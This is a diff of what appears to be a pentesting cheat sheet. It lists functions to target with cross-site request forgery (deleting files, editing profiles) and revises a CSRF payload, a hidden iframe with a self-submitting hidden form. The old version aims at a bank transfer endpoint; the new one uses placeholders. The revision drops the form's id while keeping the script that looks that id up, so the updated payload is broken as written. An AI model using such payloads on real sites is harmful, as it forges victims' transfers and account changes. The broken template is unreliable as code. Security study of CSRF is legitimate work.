@@ -87,13 +87,15 @@ CSRF Common Critical functions:
 - Delete File 
 - Profile edit
 
-```
+```html
 <iframe style="display:none" name="csrf-frame"></iframe>
-<form method='POST' action='http://bank.com/transfer.php' target="csrf-frame" id="csrf-form">
-  <input type='hidden' name='<name>' value='<value>'>
-  <input type='submit' value='submit'>
+<form method="$method" action="$url">
+  <input type="hidden" name="$param1name" value="$param1value">
+  <input type="submit" value="submit">
 </form>
-<script>document.getElementById("csrf-form").submit()</script>
+<script>
+  document.getElementById("csrf-form").submit()
+</script>
 ```
 
 # Privilege
